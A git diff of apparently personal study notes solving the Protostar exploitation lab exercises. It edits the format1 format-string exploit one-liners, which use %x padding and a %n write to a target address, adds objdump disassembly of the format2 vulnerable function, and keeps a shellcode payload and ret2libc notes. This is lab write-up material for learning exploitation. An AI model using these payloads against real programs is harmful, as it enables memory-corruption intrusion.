@@ -20,12 +20,15 @@
     - [stack6 solution](#stack6-solution)
   - [stack7: ret2libc](#stack7-ret2libc)
     - [ret2Libc](#ret2libc)
+    - [ret2Libc Summary](#ret2libc-summary)
     - [ret2Libc advanced](#ret2libc-advanced)
-    - [misc](#misc)
+  - [misc](#misc)
   - [format0: given the &target([ebp-0xc]) > &buffer([ebp-0x4c])](#format0-given-the-targetebp-0xc--bufferebp-0x4c)
     - [format0 solution](#format0-solution)
   - [format1: assume no ASLR](#format1-assume-no-aslr)
   - [format1: solution](#format1-solution)
+  - [format2](#format2)
+  - [format4: plt && got](#format4-plt--got)
 
 ## stack0
 
@@ -293,7 +296,9 @@ payload=$(echo -en '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3
   0xffffffff
 ```
 
-- Summary: Overwrite the `<callee>` address, and pretend to be a normal call. Basic structure:
+### ret2Libc Summary
+
+- Overwrite the `<callee>` address, and pretend to be a normal call. Basic structure:
 
 ```sh
   # payload = padding + libc_func_addr + ret_addr(could be used to chain exec) + func_param0 + func_param1
@@ -333,7 +338,7 @@ x/s 0x7ffff7f745aa
 
 - Note that the offset should be calculated in the target machine.
 
-### misc
+## misc
 
 ```sh
 "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
@@ -387,6 +392,45 @@ p &target
 ## format1: solution
 
 ```sh
-./format1 $(echo -en "AAAA\x38\x96\x04\x08BBBB";for i in {0..960};do echo -en "%.8x-";done;echo -en "%x";)
-./format1 $(echo -en "AAAA\x38\x96\x04\x08BBBB";for i in {0..960};do echo -en "%.8x-";done;echo -en "%n";)
+./format1 $(echo -en "AAAAAACCCCBBBB";for i in {0..127};do echo -en "%.8x-";done;echo -en "%x";)
+./format1 $(echo -en "AAAAAA\x38\x96\x04\x08BBBB";for i in {0..127};do echo -en "%.8x-";done;echo -en "%n";)
 ```
+
+## format2
+
+```sh
+  # gdb -batch -ex 'file ./format2' -ex 'disassemble vuln'
+objdump -M intel -d ./format2 | awk -F"\n" -v RS="\n\n" '$1 ~ /vuln/'
+```
+
+```asm
+08048454 <vuln>:
+ 8048454:       55                      push   ebp
+ 8048455:       89 e5                   mov    ebp,esp
+ 8048457:       81 ec 18 02 00 00       sub    esp,0x218
+ 804845d:       a1 d8 96 04 08          mov    eax,ds:0x80496d8
+ 8048462:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
+ 8048466:       c7 44 24 04 00 02 00    mov    DWORD PTR [esp+0x4],0x200
+ 804846d:       00
+ 804846e:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
+ 8048474:       89 04 24                mov    DWORD PTR [esp],eax
+ 8048477:       e8 e0 fe ff ff          call   804835c <fgets@plt>
+ 804847c:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
+ 8048482:       89 04 24                mov    DWORD PTR [esp],eax
+ 8048485:       e8 f2 fe ff ff          call   804837c <printf@plt>
+ 804848a:       a1 e4 96 04 08          mov    eax,ds:0x80496e4
+ 804848f:       83 f8 40                cmp    eax,0x40
+ 8048492:       75 0e                   jne    80484a2 <vuln+0x4e>
+ 8048494:       c7 04 24 90 85 04 08    mov    DWORD PTR [esp],0x8048590
+ 804849b:       e8 ec fe ff ff          call   804838c <puts@plt>
+ 80484a0:       eb 17                   jmp    80484b9 <vuln+0x65>
+ 80484a2:       8b 15 e4 96 04 08       mov    edx,DWORD PTR ds:0x80496e4
+ 80484a8:       b8 b0 85 04 08          mov    eax,0x80485b0
+ 80484ad:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
+ 80484b1:       89 04 24                mov    DWORD PTR [esp],eax
+ 80484b4:       e8 c3 fe ff ff          call   804837c <printf@plt>
+ 80484b9:       c9                      leave
+ 80484ba:       c3                      ret
+```
+
+## format4: plt && got
